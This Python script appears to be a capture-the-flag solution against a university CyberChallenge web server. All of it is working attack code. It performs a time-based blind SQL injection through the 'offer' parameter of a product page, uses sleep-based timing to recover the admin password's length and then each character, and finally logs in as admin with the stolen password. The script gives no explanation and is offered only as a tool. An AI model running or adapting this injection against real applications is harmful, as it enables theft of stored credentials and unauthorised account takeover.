import requests
from datetime import datetime
import string

base_url = 'http://cyberchallenge.disi.unitn.it:50050'

login_body = {'username': 'Serom', 'password':'Password'}
username = "admin"

r = requests.post(base_url+'/login', login_body)
cookies = r.cookies

length_found = False
length = 0
while(not length_found):
    injection= f"AND (LENGTH((SELECT password FROM user WHERE username = '{username}')) \
        = {length}) AND sleep(2)"
    injection_body = {'offer': '15 ' + injection}

    time_init = datetime.now()
    r = requests.post(base_url+'/product/5', injection_body, cookies=cookies)
    time_response = datetime.now()-time_init
    print(f"{length} - {time_response.total_seconds()}")

    if(time_response.total_seconds() > 2):
        length_found = True
        print(f"Password Length: {length}")

    else:
        length += 1

counter = 0
password = ""
while(counter < length):

    for char in string.printable:

        if(char == '%' or char == '_'):
            print(f"{char} - Skip Wildcard")
            continue

        current_try = password + char

        injection= f"AND (SELECT (SELECT password FROM user WHERE username = '{username}') \
            like BINARY '{current_try}%') AND sleep(2)"
        injection_body = {'offer': '15 ' + injection}

        time_init = datetime.now()
        r = requests.post(base_url+'/product/5', injection_body, cookies=cookies)
        time_response = datetime.now()-time_init
        print(f"{char} - {time_response.total_seconds()}")

        if(time_response.total_seconds() > 2):
            counter += 1
            password += char
            print(f"Current Password: {password}, Current Length: {counter}")
            break


print("Complete Password: " + password)

login_body = {'username': username, 'password':password}
r = requests.post(base_url+'/login', login_body)

invalid_login = '<div class="flash-message error">'
if(invalid_login in r.text):
    print("Login Failed")
else:
    print("Login Successful")


#print(r.status_code)
#print(r.text)

#time_init = datetime.now()
#r = requests.post(base_url+'/product/5', injection_body, cookies=cookies)
#time_response = datetime.now()-time_init
#print(time_response.total_seconds())